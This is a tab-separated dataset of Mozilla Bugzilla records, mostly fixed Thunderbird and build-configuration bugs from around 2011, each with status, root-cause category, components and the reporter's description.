Id%TAB%Opening%TAB%Reporter%TAB%VerificationStatus%TAB%ResolutionStatus%TAB%RootCauseCategory%TAB%Components%TAB%Description%TAB%FullDescription
538%TAB%904184243%TAB%3791%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%HTML Dialogs,UI,Bugzilla-General%TAB%Bugzilla can't search bug lists for a text match%TAB%Bugzilla can't search bug lists for a text match
539%TAB%904196016%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%MIMELib,UI,Bugzilla-General%TAB%enter_bug.cgi chokes if we have multiple products.%TAB%enter_bug.cgi chokes if we have multiple products.
685166%TAB%1315376487%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Release Engineering,Build Config%TAB%Port the work to enable mozconfigs to live in the source tree%TAB%Port the work to enable mozconfigs to live in the source treeFirefox have been working on putting their mozconfigs in the source tree. This will make it simpler at merge time, as any differences from central to aurora (for example) will just be automatically merged across, and we won't need to do a separate analysis in the build-config repository for what needs to be merged across mozconfigs.
684865%TAB%1315290583%TAB%120380%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%When receiving a new email, the notification doesn't display the email address of the sender when he has no name%TAB%When receiving a new email, the notification doesn't display the email address of the sender when he has no nameSome users didn't set their real name when sending an email, so only their email address is displayed in the From: field, i.e.    foo@bar.com  instead of    Mr Foo <foo@bar.com>  When such emails arrive in the inbox, the notification which popup doesn't mention who sent the email. All we see is "... from " at the end of the message. If no name is set, then it should fallback to "... from foo@bar.com" so that we can at a glance see who sent the email and decide if it should be read immediately or can wait a bit while doing some other work.
684508%TAB%1315032638%TAB%121364%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Line breaks in internet-cited text break UTF-8 quoted-printable characters%TAB%Line breaks in internet-cited text break UTF-8 quoted-printable charactersUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.16) Gecko/20101125 Thunderbird/3.0.11  In a non-HTML reply to a message containing long lines with non-ASCII characters the internet-cited (>) line of the original text has a newline splitting UTF-8 quoted-printable characters in two.  This results in two illegal characters appearing in the mail message body.  In Thunderbird these appear with a question mark (?).  When Apple Mail displays such a message it fails to decode its contents as UTF-8 displaying it as gibberish.  Reproducible: Always  Steps to Reproduce: 1. Create a plain-text UTF-8 encoded message containing a line of 1000 non-ASCII characters (e.g. αααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααα) 2. Send message to yourself 3. Reply to the message 4. Examine the sent message in the sent folder or the Outbox 5. The message will contain lines like the following > ααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααααα� �α   Here is one line of the problematic internet-cited message, with the problem marked with "<------- ERROR"  > =CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=CE=B1=
684453%TAB%1315000195%TAB%131213%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Migration%TAB%Some unused variables in Migrate method%TAB%Some unused variables in Migrate methodShould be removed.
684376%TAB%1314970897%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End,Theme%TAB%[Message header]: Make the tango orange more eye-friendly (and a gradient)%TAB%[Message header]: Make the tango orange more eye-friendly (and a gradient)The current tango orange is not very eye-friendly and doesn't look so nice in the new header. So, make it better.
684302%TAB%1314955696%TAB%72685%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End,Theme%TAB%Quick Filter Read Icon Different From Read Column Icon%TAB%Quick Filter Read Icon Different From Read Column IconUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0a1) Gecko/20110901 Firefox/9.0a1 Build ID: 20110901030807  Steps to reproduce:  The read icon on the quick filter bar and the read icon on the column heading are not the same.    Expected results:  The two icons should be the same.
683460%TAB%1314753852%TAB%38228%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%update won't allow Thunderbird 3.1.13%TAB%update won't allow Thunderbird 3.1.13User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:6.0.1) Gecko/20100101 Firefox/6.0.1 Build ID: 20110830092941  Steps to reproduce:  Thunderbird 3.1.12  Under the administrator account, selected Help -> Check for Updates.   Actual results:  Big fancy splashy dialog asking whether I want to update to 6.0.  None of the 3 options were for TB 3.1.13.   Expected results:  The update must be to 3.1.13. TB 6.0 destroyed my .msf index files. See Bug 682588. Also Bug 682721 nee Bug 682731 et seq.  The Mozilla Foundation Security Advisory 2011-34 indicates that Thunderbird 3.1.13 fixes the problem: https://www.mozilla.org/security/announce/2011/mfsa2011-34.html  Bug 682927 indicates the problem is fixed in the common core product, but doesn't mention TB 3.1.13.
683405%TAB%1314721159%TAB%389997%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Unable to sync folders%TAB%Unable to sync foldersWe were able sync the account to Thunderbird and view everything in the inbox, but the folders didn't sync over.
683178%TAB%1314687912%TAB%253233%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Port bug 673556 to comm-central%TAB%Port bug 673556 to comm-centralrs=Standard8 via irc. Pushed to comm-central rev efc02fae47a9
683093%TAB%1314652739%TAB%298458%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%OS Integration%TAB%Drag Attachments to a Finder-Window isnt working%TAB%Drag Attachments to a Finder-Window isnt workingUser Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.109 Safari/535.1  Steps to reproduce:  I drag an Attachment from the "preview"-section to a MacOS X 10.7.1-Finder-Window.   Actual results:  I drag an Attachment from the "preview"-section to a MacOS X 10.7.1-Finder-Window. Instead of the right file, I get a file called "undefined". The filesize is of "undefined" is exactly the right size of the droped file.   If i look with text-wrangler into the file, the data are the requested. TB doesnt name the dragged file correctly.   Expected results:  The file appears in the finder-window, but the filename isnt given correctly.
682898%TAB%1314607576%TAB%305876%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Build Config%TAB%Create a test to ensure comm-central and mozilla-central configuration harness is in sync%TAB%Create a test to ensure comm-central and mozilla-central configuration harness is in syncBug 656049 copied some of mozilla-central's configuration harness into comm-central, and they will diverge over time.  Create a make check test that verifies that the files are identical and warns otherwise, so we can more easily keep them in sync.
682897%TAB%1314607462%TAB%305876%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%re-sync comm-central's copies of mozilla-central build harness%TAB%re-sync comm-central's copies of mozilla-central build harnessBug 656049 copied some of mozilla-central's configuration harness into comm-central, and they have since diverged.  Needs merging back in sync.  Justin Wood (:Callek) Assignee
682639%TAB%1314460679%TAB%314746%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General,Message Compose Window%TAB%can't open attachment,can't open attachment from compose window%TAB%can't open attachment,can't open attachment from compose windowUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0 Build ID: 20110811165603  Steps to reproduce:  when composing a mail, attached a .jpg, right-click-menu to "open" and nothing happens.   Actual results:  nothing.  Neither did the file open in a viewer nor an error message   Expected results:  I expected the file to open in a viewer.  Checked tools/options/attachments and their is a program associated with .jpg
682581%TAB%1314434751%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Remove mail's dependency on nsTryToClose.js%TAB%Remove mail's dependency on nsTryToClose.jsFirefox is removing nsTryToClose.js from Firefox because it registers as app-startup and hence slows down starting up.  We should just switch these to observer registrations in appropriate places.  Someone fancy taking this on? I've said we'll do this before the next merge point, so they can land their patch before then.
682303%TAB%1314341836%TAB%218420%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Today build is broken: jemalloc is missing (20110826)%TAB%Today build is broken: jemalloc is missing (20110826)Updating to today build broke TB with warning because "jemalloc is missing"  Reinstalling yesterday build (Mozilla/5.0 (Windows NT 6.1; rv:9.0a1) Gecko/20110825 Thunderbird/9.0a1) all is fine
682183%TAB%1314293065%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%compose window is not noticing attachment keywords%TAB%compose window is not noticing attachment keywordsSome time in the last few days comm-central broke so Thunderbird is no longer prompting me about potentially missing attachments when I use one of the attachment keywords in my message text.
